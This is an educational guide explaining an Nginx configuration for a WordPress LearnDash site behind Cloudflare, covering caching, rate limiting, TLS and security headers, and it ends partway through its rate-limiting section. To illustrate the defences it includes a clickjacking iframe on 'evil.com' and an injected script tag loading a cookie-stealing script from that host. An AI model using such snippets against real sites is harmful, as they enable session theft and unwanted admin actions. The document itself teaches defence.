# Nginx Configuration Explained - Educational Guide

**For**: LearnDash LMS WordPress + Cloudflare + High Performance
**Last Updated**: 2024-12-31

---

## Table of Contents

1. [FastCGI Cache Configuration](#1-fastcgi-cache-configuration)
2. [Rate Limiting Zones](#2-rate-limiting-zones)
3. [Cloudflare Real IP Configuration](#3-cloudflare-real-ip-configuration)
4. [SSL/TLS Configuration](#4-ssltls-configuration)
5. [Security Headers](#5-security-headers)
6. [Performance Optimizations](#6-performance-optimizations)
7. [Cache Bypass Logic](#7-cache-bypass-logic)
8. [PHP Processing](#8-php-processing)
9. [Rate Limited Endpoints](#9-rate-limited-endpoints)
10. [Static Asset Caching](#10-static-asset-caching)
11. [WordPress Security](#11-wordpress-security)

---

## 1. FastCGI Cache Configuration

### What is FastCGI Cache?

FastCGI cache stores the **complete HTML output** of PHP requests in Nginx's memory/disk. When a user requests a page, Nginx can serve the cached HTML directly without running PHP-FPM or querying the database.

**Performance Impact**: Reduces page load time from ~300ms to ~10ms (30x faster!)

```nginx
fastcgi_cache_path /var/cache/nginx/wordpress
    levels=1:2
    keys_zone=wordpress:100m
    inactive=60m
    max_size=512m
    use_temp_path=off;
```

### Line-by-Line Explanation

**`/var/cache/nginx/wordpress`**

- **What**: Directory path where cached files are stored
- **Why**: Separate from main filesystem for easier management and potential RAM disk mounting
- **Performance**: Using SSD storage makes cache reads extremely fast

**`levels=1:2`**

- **What**: Creates a 2-level directory hierarchy (e.g., `/a/bc/cache-key-hash`)
- **Why**: Prevents having millions of files in one directory (filesystem performance killer)
- **Technical**: First level = 1 character, second level = 2 characters from MD5 hash
- **Example**: Hash `abcdef123` → `/a/bc/abcdef123`

**`keys_zone=wordpress:100m`**

- **What**: Creates shared memory zone named "wordpress" with 100MB for metadata
- **Why**: Stores cache keys/metadata in RAM for instant lookup (no disk I/O)
- **Capacity**: 100MB can store ~800,000 cache keys (each key ~128 bytes)
- **Trade-off**: Uses RAM but makes cache lookups microsecond-fast

**`inactive=60m`**

- **What**: Removes cached items not accessed for 60 minutes
- **Why**: Prevents stale content from filling disk; WordPress content changes frequently
- **Tuning**:
  - Blog/news sites: 30m (content changes often)
  - Documentation: 2h (content changes rarely)
  - E-commerce: 15m (inventory/prices change)

**`max_size=512m`**

- **What**: Maximum total disk space for cache files
- **Why**: Prevents cache from consuming entire disk
- **Calculation**: Average page = 50KB → 512MB stores ~10,000 cached pages
- **Monitoring**: Check with `du -sh /var/cache/nginx/wordpress`

**`use_temp_path=off`**

- **What**: Write cache files directly to cache directory (skip temp directory)
- **Why**: Reduces disk I/O (one write instead of two: temp → cache)
- **Performance**: 10-20% faster cache writes, especially on HDD

---

### Cache Key Configuration

```nginx
fastcgi_cache_key "$scheme$request_method$host$request_uri";
```

**What**: Unique identifier for each cached page
**Components**:

- `$scheme` = http or https (cache separately for security)
- `$request_method` = GET, POST, etc.
- `$host` = example.com
- `$request_uri` = /courses/php-101?page=2

**Example**: `httpsGETexample.com/courses/php-101?page=2`

**Why This Matters**: Two users requesting the same URL get the same cached page (unless bypassed)

---

### Cache Staleness Configuration

```nginx
fastcgi_cache_use_stale error timeout invalid_header updating http_500 http_503;
fastcgi_cache_background_update on;
fastcgi_cache_lock on;
fastcgi_cache_lock_timeout 5s;
```

**`fastcgi_cache_use_stale`** - Serve old cache during problems

- **error**: PHP-FPM crashed
- **timeout**: PHP script taking too long
- **updating**: Another request is updating cache
- **http_500/503**: Server errors
- **User Experience**: Users see slightly old content instead of error page
- **Availability**: Keeps site running during backend issues

**`fastcgi_cache_background_update on`**

- **What**: Update cache in background while serving stale content
- **Why**: User gets instant response (stale cache), next user gets fresh cache
- **Without**: User waits while cache updates (slower experience)

**`fastcgi_cache_lock on`** - Prevent cache stampede

- **Problem**: 1000 users hit uncached page → 1000 PHP requests → server crash
- **Solution**: First request generates cache, other 999 wait for lock
- **Result**: Only 1 PHP execution instead of 1000

**`fastcgi_cache_lock_timeout 5s`**

- **What**: Wait max 5 seconds for cache lock
- **Why**: If cache generation fails, don't make users wait forever
- **After timeout**: Request proceeds to PHP-FPM directly

---

### Cache Ignore Headers

```nginx
fastcgi_ignore_headers Cache-Control Expires Set-Cookie;
```

**Why Ignore These Headers?**

**`Cache-Control`**: WordPress plugins often set `Cache-Control: no-cache` unnecessarily

- **Example**: A plugin sets no-cache on all pages "to be safe"
- **Result**: Cache never works despite configuration
- **Solution**: We control caching at Nginx level, not application level

**`Expires`**: Same issue as Cache-Control

**`Set-Cookie`**: WordPress sets cookies for tracking, not authentication

- **Problem**: WordPress sets `wordpress_test_cookie` on every visit
- **Without Ignore**: Every user gets unique cache (defeats purpose!)
- **With Ignore**: We use `$http_cookie` variable in bypass logic instead

**Trade-off**: We take full control of caching logic (see Cache Bypass section)

---

## 2. Rate Limiting Zones

### What is Rate Limiting?

Rate limiting restricts how many requests a user can make in a time window. This prevents:

- **Brute force attacks** (password guessing)
- **DDoS attacks** (overwhelming server)
- **API abuse** (scraping, bot attacks)

```nginx
limit_req_zone $binary_remote_addr zone=login:10m rate=5r/m;
limit_req_zone $binary_remote_addr zone=api:10m rate=60r/m;
limit_req_zone $binary_remote_addr zone=general:10m rate=10r/s;
limit_req_status 429;
```

---

### Login Rate Limiting

```nginx
limit_req_zone $binary_remote_addr zone=login:10m rate=5r/m;
```

**`$binary_remote_addr`** - User's IP address in binary format

- **Why binary?**: 4 bytes instead of 15 bytes (e.g., "192.168.100.200")
- **Memory savings**: 10MB stores 2.5 million IPs (binary) vs 666,000 IPs (text)

**`zone=login:10m`**

- Creates shared memory zone "login" with 10MB
- Stores state for ~1.6 million unique IPs

**`rate=5r/m`** - 5 requests per minute

- **Why so strict?**: Login page should only be hit during actual login
- **Attack scenario**: Attacker tries 1000 passwords/minute → blocked after 5 attempts
- **Legitimate user**: Types password wrong 3 times → still has 2 attempts left before 1-minute lockout

**Application**: Applied to `/wp-login.php` endpoint

---

### API Rate Limiting

```nginx
limit_req_zone $binary_remote_addr zone=api:10m rate=60r/m;
```

**`rate=60r/m`** - 60 requests per minute (1 per second)

**Why This Rate?**

- **WordPress REST API**: Used by mobile apps, AJAX calls, third-party integrations
- **LearnDash**: Progress tracking, quiz submissions (1-2 per minute during course)
- **Too Strict**: Breaks legitimate API usage
- **Too Loose**: Allows scraping/abuse

**Application**: Applied to `/wp-json/*` and `/wp-admin/admin-ajax.php`

---

### General Rate Limiting

```nginx
limit_req_zone $binary_remote_addr zone=general:10m rate=10r/s;
```

**`rate=10r/s`** - 10 requests per second (600/minute)

**Why This Rate?**

- **Normal browsing**: User clicks 1-3 pages/second max
- **Page with assets**: Browser requests HTML + CSS + JS + images (10-20 files)
- **Burst traffic**: User navigating quickly through course materials

**Application**: Could be applied site-wide (not in current config, but available)

---

### HTTP Status Code

```nginx
limit_req_status 429;
```

**429 Too Many Requests** - Standard HTTP code for rate limiting

- **Why not 403?**: 403 means "forbidden forever", 429 means "try again later"
- **Client behavior**: Modern clients/bots recognize 429 and back off
- **Logging**: Easy to identify rate-limited requests in logs

---

### Rate Limiting in Action

```nginx
location = /wp-login.php {
    limit_req zone=login burst=3 nodelay;
    # ...
}
```

**`burst=3`** - Allow bursting up to 3 requests

- **Scenario**: User fat-fingers login button 3 times quickly
- **Without burst**: 2nd and 3rd requests blocked (bad UX)
- **With burst=3**: All 3 requests processed, then rate limit applies

**`nodelay`** - Process burst requests immediately

- **Without nodelay**: Requests queued to smooth rate (user waits)
- **With nodelay**: Process all burst requests instantly (better UX)

**Trade-off**: Allows short bursts but prevents sustained attacks

---

## 3. Cloudflare Real IP Configuration

### The Problem

When using Cloudflare proxy:

```
User (1.2.3.4) → Cloudflare (104.16.x.x) → Your Server
```

**Without real_ip configuration**:

- Nginx sees Cloudflare's IP (104.16.x.x) in logs
- Rate limiting treats ALL users as one IP (Cloudflare's)
- Fail2ban can't ban real attackers
- Analytics show Cloudflare IPs instead of visitor countries

**With real_ip configuration**:

- Nginx sees user's real IP (1.2.3.4)
- Rate limiting works per-user
- Fail2ban bans actual attackers
- Analytics show real visitor locations

---

### Configuration

```nginx
set_real_ip_from 103.21.244.0/22;
set_real_ip_from 104.16.0.0/13;
# ... (all Cloudflare IP ranges)

real_ip_header CF-Connecting-IP;
real_ip_recursive on;
```

**`set_real_ip_from 103.21.244.0/22`**

- **What**: Trust these IP ranges to provide real IP in headers
- **Why specific IPs?**: Only trust Cloudflare's servers (prevent IP spoofing)
- **Security**: If we trusted everyone, attacker could fake IP via header

**`real_ip_header CF-Connecting-IP`**

- **What**: Look for user's IP in `CF-Connecting-IP` header
- **Cloudflare sets**: `CF-Connecting-IP: 1.2.3.4` (user's real IP)
- **Alternative headers**: `X-Forwarded-For` (less reliable, can be spoofed)

**`real_ip_recursive on`**

- **What**: Walk through multiple proxy layers
- **Example**: User → VPN (5.6.7.8) → Cloudflare (104.16.x.x) → Server
- **Result**: Nginx correctly identifies 5.6.7.8 as real IP

---

### Why This is CRITICAL

**Scenario**: Attacker launches brute force attack

1. **Without real_ip**: Nginx sees Cloudflare IP → rate limit blocks Cloudflare → ALL users blocked
2. **With real_ip**: Nginx sees attacker's IP → rate limit blocks attacker → other users unaffected

**Log Example**:

```
# Without real_ip
104.16.123.45 - - "POST /wp-login.php" 200  # Can't identify attacker

# With real_ip
1.2.3.4 - - "POST /wp-login.php" 429  # Attacker IP logged, rate limited
```

---

### IP Ranges Explanation

Cloudflare's IP ranges change over time. The configuration includes:

**IPv4 Ranges** (14 ranges):

- `103.21.244.0/22` - 1,024 IPs
- `104.16.0.0/13` - 524,288 IPs (largest range)
- ... etc

**IPv6 Ranges** (7 ranges):

- `2400:cb00::/32` - 79 octillion IPs
- ... etc

**Maintenance**: Update from <https://www.cloudflare.com/ips/> annually

---

## 4. SSL/TLS Configuration

```nginx
ssl_certificate /etc/letsencrypt/live/example.com/fullchain.pem;
ssl_certificate_key /etc/letsencrypt/live/example.com/privkey.pem;
ssl_protocols TLSv1.2 TLSv1.3;
ssl_ciphers 'ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:...';
ssl_prefer_server_ciphers off;
ssl_session_cache shared:SSL:10m;
ssl_session_timeout 10m;
ssl_session_tickets off;
```

---

### SSL Protocols

```nginx
ssl_protocols TLSv1.2 TLSv1.3;
```

**TLSv1.2** (2008):

- **Support**: All modern browsers + old Android/iOS
- **Security**: Still secure with proper ciphers
- **Why include**: ~5% of users still on old devices

**TLSv1.3** (2018):

- **Faster**: 1-RTT handshake (TLSv1.2 = 2-RTT)
- **More secure**: Removed weak ciphers, forward secrecy mandatory
- **Adoption**: 95% of browsers support it

**Disabled**: TLSv1.0, TLSv1.1 (PCI-DSS requirement, security vulnerabilities)

---

### Cipher Suites

```nginx
ssl_ciphers 'ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:...';
```

**Cipher Suite Breakdown**: `ECDHE-RSA-AES128-GCM-SHA256`

1. **ECDHE** (Elliptic Curve Diffie-Hellman Ephemeral)
   - **Purpose**: Key exchange
   - **Why**: Forward secrecy (past sessions safe if private key stolen)
   - **Alternative**: RSA (no forward secrecy)

2. **RSA** or **ECDSA**
   - **Purpose**: Authentication (prove server identity)
   - **ECDSA**: Faster, smaller keys (256-bit ECDSA = 3072-bit RSA)
   - **RSA**: Better compatibility

3. **AES128-GCM**
   - **Purpose**: Symmetric encryption
   - **AES128**: 128-bit key (fast, secure for HTTPS)
   - **GCM**: Galois/Counter Mode (AEAD - authenticated encryption)
   - **Alternative**: AES256 (slower, minimal security benefit for HTTPS)

4. **SHA256**
   - **Purpose**: Message authentication
   - **Why**: Cryptographically secure hashing

**Cipher Priority Order**:

1. ECDHE-ECDSA-AES128-GCM (fastest, most secure)
2. ECDHE-RSA-AES128-GCM (compatible, secure)
3. ECDHE-ECDSA-AES256-GCM (paranoid security)
4. CHACHA20-POLY1305 (mobile devices without AES hardware)

---

### Server Cipher Preference

```nginx
ssl_prefer_server_ciphers off;
```

**Modern Best Practice**: Let client choose cipher

**Why `off`?**

- Modern browsers prefer best cipher automatically
- Mobile devices can choose CHACHA20 (faster without AES hardware)
- Server doesn't always know client's hardware capabilities

**Old Practice** (`on`): Server enforces cipher order

- **Problem**: Server might force AES on mobile without AES hardware (slow)

---

### Session Cache

```nginx
ssl_session_cache shared:SSL:10m;
ssl_session_timeout 10m;
```

**What**: Reuse SSL session for multiple requests

**Without Session Cache**:

```
User Request 1: Full TLS handshake (2 round trips, 100ms)
User Request 2: Full TLS handshake (2 round trips, 100ms)
User Request 3: Full TLS handshake (2 round trips, 100ms)
```

**With Session Cache**:

```
User Request 1: Full TLS handshake (100ms)
User Request 2-100: Session resume (0ms - cached)
```

**`shared:SSL:10m`**:

- **shared**: All Nginx workers share cache (vs per-worker cache)
- **10m**: 10MB cache = ~40,000 sessions
- **Calculation**: 10MB / 256 bytes per session

**`ssl_session_timeout 10m`**:

- **What**: Keep session cached for 10 minutes
- **Why**: User browsing session typically < 10 minutes
- **Too long**: Memory waste
- **Too short**: Cache misses, slower connections

---

### Session Tickets

```nginx
ssl_session_tickets off;
```

**Why Disabled?**

**Session Tickets** (alternative to session cache):

- **How**: Server encrypts session state, sends to client
- **Problem**: Requires ticket encryption key shared across servers
- **Security issue**: If key compromised, forward secrecy broken

**Best Practice**: Use session cache instead (server-controlled, more secure)

---

## 5. Security Headers

Security headers tell the browser how to handle your page securely.

```nginx
add_header X-Frame-Options "SAMEORIGIN" always;
add_header X-Content-Type-Options "nosniff" always;
add_header X-XSS-Protection "1; mode=block" always;
add_header Referrer-Policy "strict-origin-when-cross-origin" always;
add_header Permissions-Policy "geolocation=(), microphone=(), camera=()" always;
add_header Content-Security-Policy "..." always;
```

**`always`** keyword: Send header even on error responses (403, 404, 500)

---

### X-Frame-Options: SAMEORIGIN

```nginx
add_header X-Frame-Options "SAMEORIGIN" always;
```

**Attack Prevented**: Clickjacking

**Clickjacking Example**:

```html
<!-- Attacker's site: evil.com -->
<iframe src="https://yoursite.com/wp-admin/users.php?action=delete&user=1">
</iframe>
<button style="position: absolute; opacity: 0;">Click for free iPad!</button>
```

User clicks invisible button → Actually deletes WordPress admin

**SAMEORIGIN**: Only allow iframing from same domain

- `yoursite.com` can iframe `yoursite.com/page` ✓
- `evil.com` cannot iframe `yoursite.com/page` ✗

**Alternatives**:

- `DENY`: Never allow iframing (breaks embed features)
- `ALLOW-FROM`: Deprecated, use CSP frame-ancestors instead

---

### X-Content-Type-Options: nosniff

```nginx
add_header X-Content-Type-Options "nosniff" always;
```

**Attack Prevented**: MIME type confusion attacks

**Example Attack**:

1. Attacker uploads `evil.jpg` (actually contains JavaScript)
2. File served as `Content-Type: image/jpeg`
3. **Without nosniff**: Browser sees `<script>`, ignores MIME type, executes JS
4. **With nosniff**: Browser refuses to execute (MIME mismatch)

**Why Important**: Prevents uploaded files from executing as scripts

---

### X-XSS-Protection: 1; mode=block

```nginx
add_header X-XSS-Protection "1; mode=block" always;
```

**What**: Browser's built-in XSS filter

**Options**:

- `0`: Disable XSS filter
- `1`: Enable, sanitize page
- `1; mode=block`: Enable, block page entirely if XSS detected

**Modern Status**: Mostly replaced by Content-Security-Policy

- Chrome/Edge: Removed XSS filter (CSP is better)
- Safari/old browsers: Still uses this header

**Keep it?**: Yes, defense-in-depth for old browsers

---

### Referrer-Policy: strict-origin-when-cross-origin

```nginx
add_header Referrer-Policy "strict-origin-when-cross-origin" always;
```

**What**: Controls `Referer` header sent to external sites

**Example**:

- User on: `https://yoursite.com/courses/secret-advanced-php?token=abc123`
- Clicks link to: `https://external.com/tool`

**Policies**:

1. **no-referrer**: Send nothing → breaks analytics
2. **strict-origin-when-cross-origin**: Send `https://yoursite.com` (no path/query)
3. **unsafe-url**: Send full URL with token → **SECURITY ISSUE**

**Why This Policy?**:

- **Same-origin**: Send full referer (helps your analytics)
- **Cross-origin**: Send only origin (protects sensitive URLs)

---

### Permissions-Policy

```nginx
add_header Permissions-Policy "geolocation=(), microphone=(), camera=()" always;
```

**What**: Disable browser features your site doesn't need

**`geolocation=()`**: Disable geolocation API

- **Why**: WordPress doesn't need user location
- **Attack prevention**: Malicious plugin can't track users

**`microphone=()` & `camera=()`**: Disable media access

- **Why**: LMS doesn't need microphone/camera (unless you add video calls later)
- **Privacy**: Prevents accidental permissions requests

**To Enable Later**:

```nginx
# Allow camera for video calls
camera=(self)  # Only your domain
camera=(self https://zoom.us)  # Your domain + Zoom embeds
```

---

### Content-Security-Policy (CSP)

```nginx
add_header Content-Security-Policy "default-src 'self' https:; script-src 'self' 'unsafe-inline' 'unsafe-eval' https://cdnjs.cloudflare.com; ..." always;
```

**Most Important Security Header** - Controls what resources can load

---

#### CSP Directives Explained

**`default-src 'self' https:`**

- **Fallback policy**: If no specific directive, use this
- `'self'`: Allow resources from same origin
- `https:`: Allow any HTTPS resource (blocks HTTP mixed content)

**`script-src 'self' 'unsafe-inline' 'unsafe-eval' https://cdnjs.cloudflare.com`**

- **What**: Controls JavaScript execution
- `'self'`: Your domain's JS files
- `'unsafe-inline'`: Allow `<script>` tags in HTML (WordPress needs this)
- `'unsafe-eval'`: Allow `eval()` (many plugins need this)
- `https://cdnjs.cloudflare.com`: Allow CDN scripts

**Why `unsafe-inline`?**: WordPress/plugins inject inline scripts
**Better approach**: Use nonces (`'nonce-xyz123'`), but requires PHP changes

**`style-src 'self' 'unsafe-inline' https://fonts.googleapis.com`**

- **What**: Controls CSS
- `'unsafe-inline'`: WordPress themes use inline styles extensively
- `https://fonts.googleapis.com`: Google Fonts API

**`font-src 'self' https://fonts.gstatic.com data:`**

- `https://fonts.gstatic.com`: Google Fonts files
- `data:`: Base64-encoded fonts (some themes use this)

**`img-src 'self' data: https:`**

- `'self'`: Your uploaded images
- `data:`: Base64-encoded images (avatars, icons)
- `https:`: Allow images from any HTTPS source (user-generated content, Gravatar, etc.)

**`connect-src 'self'`**

- **What**: AJAX/fetch/WebSocket connections
- `'self'`: Only API calls to your domain
- **Add if needed**: `https://api.stripe.com` (payment gateway)

---

#### CSP Attack Prevention Example

**Without CSP**:

```html
<!-- Attacker injects via comment/post -->
<script src="https://evil.com/steal-cookies.js"></script>
```

Browser executes malicious script → Steals session cookies

**With CSP** (`script-src 'self' https://cdnjs.cloudflare.com`):

```
Refused to load script from 'https://evil.com/steal-cookies.js' because it violates CSP directive "script-src 'self' https://cdnjs.cloudflare.com"
```

Browser blocks malicious script

---

#### CSP Tuning for Your Site

**To Monitor Violations** (report-only mode):

```nginx
add_header Content-Security-Policy-Report-Only "default-src 'self'; report-uri /csp-report" always;
```

Check `/var/log/nginx/wordpress-error.log` for violations, then tighten policy.

**Common CSP Issues**:

1. **Plugin breaks**: Check browser console, add domain to CSP
2. **Google Analytics**: Add `https://www.google-analytics.com` to `script-src`
3. **YouTube embeds**: Add `https://www.youtube.com` to `frame-src`

---

## 6. Performance Optimizations

### Keepalive Configuration

```nginx
keepalive_timeout 65;
keepalive_requests 100;
```

**HTTP Keepalive** = Reuse TCP connection for multiple requests

**Without Keepalive**:

```
Request 1: TCP handshake (50ms) + request (10ms) = 60ms
Request 2: TCP handshake (50ms) + request (10ms) = 60ms
Request 3: TCP handshake (50ms) + request (10ms) = 60ms
Total: 180ms
```

**With Keepalive**:

```
Request 1: TCP handshake (50ms) + request (10ms) = 60ms
Request 2: Reuse connection + request (10ms) = 10ms
Request 3: Reuse connection + request (10ms) = 10ms
Total: 80ms (2.25x faster!)
```

**`keepalive_timeout 65`**:

- **What**: Keep connection open for 65 seconds after last request
- **Why 65s**: Long enough for user to click next page, short enough to free resources
- **Trade-off**: Higher = more memory, lower = more TCP handshakes

**`keepalive_requests 100`**:

- **What**: Max 100 requests per connection before forcing new connection
- **Why**: Prevent connection staying open forever (memory leak prevention)
- **Typical**: User browsing session = 10-30 requests

---

### Gzip Compression

```nginx
gzip on;
gzip_vary on;
gzip_proxied any;
gzip_comp_level 6;
gzip_types text/plain text/css text/xml text/javascript application/json ...;
gzip_disable "msie6";
gzip_min_length 256;
```

**Compression Savings**:

- HTML: 80KB → 20KB (75% reduction)
- CSS: 100KB → 25KB (75% reduction)
- JavaScript: 200KB → 60KB (70% reduction)

**Page load**: 380KB → 105KB (72% reduction)

---

**`gzip on`**: Enable compression

**`gzip_vary on`**: Add `Vary: Accept-Encoding` header

- **Why**: Tell CDNs/proxies to cache compressed and uncompressed versions separately
- **Without**: Old browser gets compressed file → can't decompress → broken page

**`gzip_proxied any`**: Compress responses even for proxied requests (Cloudflare)

**`gzip_comp_level 6`**: Compression level 1-9

- **1**: Fast, low compression (50% reduction)
- **6**: Balanced (70% reduction, 20ms CPU)
- **9**: Slow, high compression (75% reduction, 100ms CPU)
- **Best**: 6 (diminishing returns after this)

**Benchmark**:

```
Level 1: 100KB → 50KB (5ms CPU)
Level 6: 100KB → 30KB (20ms CPU) ← Sweet spot
Level 9: 100KB → 28KB (100ms CPU) ← Not worth it
```

---

**`gzip_types`**: Compress these MIME types

- **Included**: text/*, application/json, application/javascript, SVG
- **Excluded**: Images (JPEG/PNG already compressed), video

**`gzip_disable "msie6"`**: Don't compress for Internet Explorer 6

- **Why**: IE6 has gzip bugs (corrupted responses)
- **Who uses IE6?**: ~0.001% of users (legacy enterprise)

**`gzip_min_length 256`**: Don't compress files smaller than 256 bytes

- **Why**: Compression overhead > savings for tiny files
- **Example**: 100-byte file → 120 bytes compressed (larger!)

---

## 7. Cache Bypass Logic

**Critical for WordPress**: We must NOT cache logged-in users or dynamic content.

```nginx
set $no_cache 0;

# POST requests - never cache
if ($request_method = POST) {
    set $no_cache 1;
}

# Query strings - don't cache (except tracking params)
if ($query_string != "") {
    set $no_cache 1;
}

# Allow caching for tracking parameters
if ($query_string ~* "^utm_|^fbclid=|^gclid=|^ref=") {
    set $no_cache 0;
}

# WordPress admin/login - never cache
if ($request_uri ~* "/wp-admin/|/wp-login\.php") {
    set $no_cache 1;
}

# LearnDash LMS - never cache user-specific content
if ($request_uri ~* "/courses/|/lessons/|/topics/|/quiz/|/my-courses/") {
    set $no_cache 1;
}

# WordPress cookies - don't cache logged-in users
if ($http_cookie ~* "wordpress_logged_in|wp-postpass") {
    set $no_cache 1;
}
```

---

### Why POST Requests Aren't Cached

```nginx
if ($request_method = POST) {
    set $no_cache 1;
}
```

**POST = User submitting data**:

- Login form
- Contact form
- Course quiz submission
- Comment submission

**Caching POST = Disaster**:

```
User A submits login form (POST) → Cache stores "Login successful for User A"
User B submits login form (POST) → Cache returns "Login successful for User A"
User B logs in as User A! (SECURITY BUG)
```

**GET requests**: Cacheable (fetching data, no side effects)
**POST requests**: Never cache (changing data, side effects)

---

### Query String Logic

```nginx
# Don't cache query strings
if ($query_string != "") {
    set $no_cache 1;
}

# EXCEPT tracking parameters
if ($query_string ~* "^utm_|^fbclid=|^gclid=|^ref=") {
    set $no_cache 0;
}
```

**Problem**: `/courses/php-101?page=2` and `/courses/php-101?page=3` are different pages

**Without query string bypass**:

- User visits `?page=2` → Cache stores page 2
- User visits `?page=3` → Cache returns page 2 (WRONG!)

**Tracking Parameters Exception**:

```
/blog/post-1?utm_source=facebook  (same content)
/blog/post-1?utm_source=twitter   (same content)
/blog/post-1                      (same content)
```

**Why cache these?**: Content identical, only tracking differs
**Result**: One cached version serves all tracking variants (better cache hit rate)

**Regex Breakdown**: `^utm_|^fbclid=|^gclid=|^ref=`

- `^utm_`: Starts with `utm_` (Google Analytics: utm_source, utm_medium, etc.)
- `^fbclid=`: Facebook click ID
- `^gclid=`: Google click ID
- `^ref=`: Referral parameter

---

### WordPress Admin Bypass

```nginx
if ($request_uri ~* "/wp-admin/|/wp-login\.php") {
    set $no_cache 1;
}
```

**Why**:

- `/wp-admin/` - User-specific dashboard, plugins, settings
- `/wp-login.php` - Login form changes with nonces

**Regex**: `~*` = case-insensitive match

- Matches: `/wp-admin/`, `/WP-ADMIN/`, `/Wp-Admin/`

**`\.php`**: Escape dot (otherwise `.` matches any character)

---

### LearnDash LMS Bypass

```nginx
if ($request_uri ~* "/courses/|/lessons/|/topics/|/quiz/|/my-courses/") {
    set $no_cache 1;
}
```

**Why LearnDash Needs Bypass**:

**`/courses/`**: Course listing (may show user's enrollment status)
**`/lessons/`**: Lesson content (may hide/show based on progress)
**`/topics/`**: Topic content (may show "complete" button differently)
**`/quiz/`**: Quiz questions/results (highly user-specific)
**`/my-courses/`**: User's dashboard (100% user-specific)

**Example Problem Without Bypass**:

```
User A visits /quiz/final-exam → Sees questions 1-5 (random) → Cache stores it
User B visits /quiz/final-exam → Gets same questions 1-5 → NOT RANDOM!
User A's answers visible to User B → CHEATING POSSIBLE
```

---

### Cookie-Based Bypass

```nginx
if ($http_cookie ~* "wordpress_logged_in|wp-postpass") {
    set $no_cache 1;
}
```

**`wordpress_logged_in_*`**: Set when user logs in

- Cookie name: `wordpress_logged_in_hash123`
- **Why**: User-specific content (admin bar, "Edit" buttons, personalized widgets)

**`wp-postpass_*`**: Set when user enters password-protected post password

- **Why**: Password-protected content shouldn't be cached and served to everyone

**Regex `~*`**: Case-insensitive
**`|`**: OR operator

**Cookie Bypass = Last Line of Defense**: Even if URI looks public, cookie says user is logged in → bypass cache

---

## 8. PHP Processing

```nginx
location ~ \.php$ {
    include snippets/fastcgi-php.conf;
    fastcgi_pass unix:/run/php/php8.3-fpm.sock;
    fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name;

    # FastCGI cache
    fastcgi_cache wordpress;
    fastcgi_cache_valid 200 60m;
    fastcgi_cache_valid 404 10m;
    fastcgi_cache_bypass $no_cache;
    fastcgi_no_cache $no_cache;

    # FastCGI buffers
    fastcgi_buffer_size 256k;
    fastcgi_buffers 256 32k;
    fastcgi_busy_buffers_size 512k;
    fastcgi_temp_file_write_size 512k;
    fastcgi_read_timeout 300;
    fastcgi_send_timeout 300;

    # Cache headers
    add_header X-FastCGI-Cache $upstream_cache_status;
    add_header X-Cache-Bypass $no_cache;
}
```

---

### FastCGI Connection

**`fastcgi_pass unix:/run/php/php8.3-fpm.sock`**

**Unix Socket vs TCP**:

- **Unix socket**: `/run/php/php8.3-fpm.sock` (faster, same machine)
- **TCP**: `127.0.0.1:9000` (network overhead, can be remote)

**Performance**:

- Unix socket: ~0.1ms connection time
- TCP localhost: ~0.5ms connection time

**When to Use TCP**: PHP-FPM on different server (rare)

---

### FastCGI Cache Validity

```nginx
fastcgi_cache_valid 200 60m;
fastcgi_cache_valid 404 10m;
```

**`200 60m`**: Cache successful responses for 60 minutes

- **Why 60m**: Blog posts don't change often, long cache = better performance
- **Purging**: Nginx Helper plugin purges cache when post updated

**`404 10m`**: Cache 404 errors for 10 minutes

- **Why cache 404?**: Broken links get hit repeatedly (bots, old bookmarks)
- **Example**: Old URL `/old-course/` → 404 → Cache it to avoid PHP execution
- **Why shorter**: In case URL becomes valid (user creates page)

---

### FastCGI Buffers

```nginx
fastcgi_buffer_size 256k;
fastcgi_buffers 256 32k;
fastcgi_busy_buffers_size 512k;
fastcgi_temp_file_write_size 512k;
```

**Problem**: Large WordPress responses (LearnDash pages with many students/courses)

**Default Buffers** (too small):

- `fastcgi_buffer_size 4k`
- `fastcgi_buffers 8 4k` (32KB total)

**Large Response Scenario**:

```
LearnDash course page: 500KB HTML (list of 200 students with progress)
Default buffer: 32KB
Result: Nginx writes 468KB to disk (slow!), then sends to user
```

**Optimized Buffers**:

```
fastcgi_buffer_size 256k     → First 256KB buffered in memory
fastcgi_buffers 256 32k      → Up to 8MB total buffering (256 × 32KB)
Result: Entire 500KB response buffered in RAM → sent instantly
```

**`fastcgi_busy_buffers_size 512k`**: Max data sent to client while still receiving from PHP-FPM

**`fastcgi_temp_file_write_size 512k`**: Write in 512KB chunks if response exceeds buffers

**Memory Trade-off**:

- More buffers = more RAM usage
- Default: 32KB × 10 concurrent requests = 320KB
- Optimized: 8MB × 10 concurrent requests = 80MB

**For LMS**: Worth it (prevents disk I/O bottleneck)

---

### FastCGI Timeouts

```nginx
fastcgi_read_timeout 300;
fastcgi_send_timeout 300;
```

**`fastcgi_read_timeout 300`**: Wait 5 minutes for PHP-FPM response

- **Default**: 60s
- **Why increase**: Slow queries, large data exports, course report generation
- **Example**: "Export all student progress" → 3-minute query

**`fastcgi_send_timeout 300`**: Wait 5 minutes for client to receive data

- **Why**: Slow client connections (mobile, poor internet)

**Not infinite**: If PHP-FPM hangs, still timeout after 5 minutes

---

### Cache Status Headers

```nginx
add_header X-FastCGI-Cache $upstream_cache_status;
add_header X-Cache-Bypass $no_cache;
```

**For Debugging**: See if cache is working

**`X-FastCGI-Cache`** values:

- `HIT`: Served from cache (FAST!)
- `MISS`: Not in cache, generated fresh
- `BYPASS`: Cache bypassed ($no_cache = 1)
- `EXPIRED`: Cache expired, regenerating

**`X-Cache-Bypass`**: Shows `$no_cache` value (0 or 1)

**Check in Browser**:

```bash
curl -I https://yoursite.com/blog/
# Response:
X-FastCGI-Cache: HIT
X-Cache-Bypass: 0
```

**Troubleshooting**:

- Always `BYPASS`? → Check cookie, URI, query string logic
- Always `MISS`? → Cache not storing (check permissions on `/var/cache/nginx/`)

---

## 9. Rate Limited Endpoints

### Login Rate Limiting

```nginx
location = /wp-login.php {
    limit_req zone=login burst=3 nodelay;

    include snippets/fastcgi-php.conf;
    fastcgi_pass unix:/run/php/php8.3-fpm.sock;
    fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name;

    # Never cache login page
    fastcgi_cache_bypass 1;
    fastcgi_no_cache 1;
}
```

**`location =`**: Exact match (faster than regex)

- `location = /wp-login.php` → Matches only `/wp-login.php`
- `location ~ \.php$` → Matches any `.php` (slower)

**Why Rate Limit Login**:

- **Brute force attack**: Try 10,000 passwords in 10 minutes
